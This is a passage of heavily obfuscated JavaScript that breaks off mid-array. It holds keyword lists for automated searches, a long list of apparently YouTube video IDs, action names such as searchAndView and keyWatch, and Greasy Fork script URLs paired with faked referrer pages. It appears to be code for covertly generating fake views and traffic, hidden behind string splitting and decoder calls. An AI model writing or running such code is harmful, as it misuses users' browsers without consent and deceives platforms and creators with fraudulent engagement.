searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + W(0xe) + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0x1a5 * -0x2 + 0x139f + -0x2b * 0x61)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x238c + 0x292 + -0x4 * -0x841)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0x2040 + 0xe4b + -0x28 * -0x73);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    V(0x1b) + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    V(0x1e) + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    V(0x10) + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + X(0xa, '0M38') + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': V(0x2) + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + W(0x18) + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
